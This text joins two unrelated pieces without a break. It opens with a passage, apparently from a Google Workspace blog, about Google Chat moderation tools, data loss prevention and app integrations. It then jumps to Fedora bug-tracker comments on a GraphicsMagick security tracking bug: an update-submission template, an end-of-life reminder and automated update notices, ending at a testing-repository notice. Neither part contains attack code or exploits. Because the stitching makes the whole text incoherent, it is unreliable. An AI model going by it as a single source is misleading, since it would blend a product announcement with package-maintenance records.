As communities grow, it’s essential to provide **tools for content moderation and data management**. Last year, we introduced [space managers](https://workspaceupdates.googleblog.com/2022/02/define-and-manage-chat-spaces-space.html), a community lead with [abilities](https://workspaceupdates.googleblog.com/2023/03/new-space-manager-capabilities-google-chat.html) to [moderate conversation](https://workspaceupdates.googleblog.com/2023/03/new-space-manager-capabilities-google-chat.html) and [manage membership](https://workspaceupdates.googleblog.com/2023/01/improved-membership-management-google-chat-spaces.html), and last year at NEXT, we rolled out [data loss prevention](https://workspaceupdates.googleblog.com/2022/10/data-loss-prevention-google-chat-generally-available.html) (DLP) for Chat. We will continue to enhance community health and data security for Google Chat.

Our partner community is extending the power of Chat through **integrations with essential third-party apps** such as [Jira, GitHub, Asana, PagerDuty](https://developers.googleblog.com/2023/03/how-to-be-more-productive-as-developer-5-app-integrations-for-google-chat-that-can-help.html), [Zendesk and Salesforce](https://workspaceupdates.googleblog.com/2023/02/release-notes-02-24-2023.html). Many organizations have **built custom workflow apps using low-code and no-code tools**, and we anticipate that this number will continue to grow with the GA releases of the Chat API and AppSheet’s Chat app building capabilities later this year.

For teams to thrive in this rapidly changing era of hybrid work, it’s essential to build authentic personal connections and a strong sense of belonging, no matter when or where individuals work. We will continue to make Google Chat the best option for Workspace customers seeking to build a community and culture for hybrid teams, with much more to come later this year.

It was created to ensure that one or more security vulnerabilities are fixed in affected versions of fedora-all.  For comments that are specific to the vulnerability please use bugs filed against the "Security Response" product referenced in the "Blocks" field.  For more information see: <http://fedoraproject.org/wiki/Security/TrackingBugs>  When submitting as an update, use the fedpkg template provided in the next comment(s).  This will include the bug IDs of this tracking bug as well as the relevant top-level CVE bugs.  Please also mention the CVE IDs being fixed in the RPM changelog and the fedpkg commit message.  NOTE: this issue affects multiple supported versions of Fedora. While only one tracking bug has been filed, please correct all affected versions at the same time.  If you need to fix the versions independent of each other, you may clone this bug as appropriate.   ```  [Comment 1](show_bug.cgi?id=1543274#c1)  Sam Fowler    2018-02-08 06:28:13 UTC  ``` Use the following template to for the 'fedpkg update' request to submit an update for this issue as it contains the top-level parent bug(s) as well as this tracking bug.  This will ensure that all associated bugs get updated when new packages are pushed to stable.  =====  # bugfix, security, enhancement, newpackage (required) type=security  # testing, stable request=testing  # Bug numbers: 1234,9876 bugs=1543272,1543274  # Description of your update notes=Security fix for [PUT CVEs HERE]  # Enable request automation based on the stable/unstable karma thresholds autokarma=True stable_karma=3 unstable_karma=-3  # Automatically close bugs when this marked as stable close_bugs=True  # Suggest that users restart after update suggest_reboot=False  ======  Additionally, you may opt to use the bodhi web interface to submit updates:  <https://bodhi.fedoraproject.org/updates/new>   ```  [Comment 2](show_bug.cgi?id=1543274#c2)  Ben Cotton    2018-11-27 17:10:01 UTC  ``` This message is a reminder that Fedora 27 is nearing its end of life. On 2018-Nov-30  Fedora will stop maintaining and issuing updates for Fedora 27. It is Fedora's policy to close all bug reports from releases that are no longer maintained. At that time this bug will be closed as EOL if it remains open with a Fedora  'version' of '27'.  Package Maintainer: If you wish for this bug to remain open because you plan to fix it in a currently maintained version, simply change the 'version'  to a later Fedora version.  Thank you for reporting this issue and we are sorry that we were not  able to fix it before Fedora 27 is end of life. If you would still like  to see this bug fixed and are able to reproduce it against a later version  of Fedora, you are encouraged  change the 'version' to a later Fedora  version prior this bug is closed as described in the policy above.  Although we aim to fix as many bugs as possible during every release's  lifetime, sometimes those efforts are overtaken by events. Often a  more recent Fedora release includes newer upstream software that fixes  bugs or makes them obsolete.   ```  [Comment 3](show_bug.cgi?id=1543274#c3)  Fedora Update System    2019-06-17 20:51:51 UTC  ``` FEDORA-2019-da4c20882c has been submitted as an update to Fedora 30. <https://bodhi.fedoraproject.org/updates/FEDORA-2019-da4c20882c>   ```  [Comment 4](show_bug.cgi?id=1543274#c4)  Fedora Update System    2019-06-17 20:52:30 UTC  ``` FEDORA-2019-425a1aa7c9 has been submitted as an update to Fedora 29. <https://bodhi.fedoraproject.org/updates/FEDORA-2019-425a1aa7c9>   ```  [Comment 5](show_bug.cgi?id=1543274#c5)  Fedora Update System    2019-06-18 01:38:14 UTC  ``` GraphicsMagick-1.3.32-1.fc30 has been pushed to the Fedora 30 testing repository.
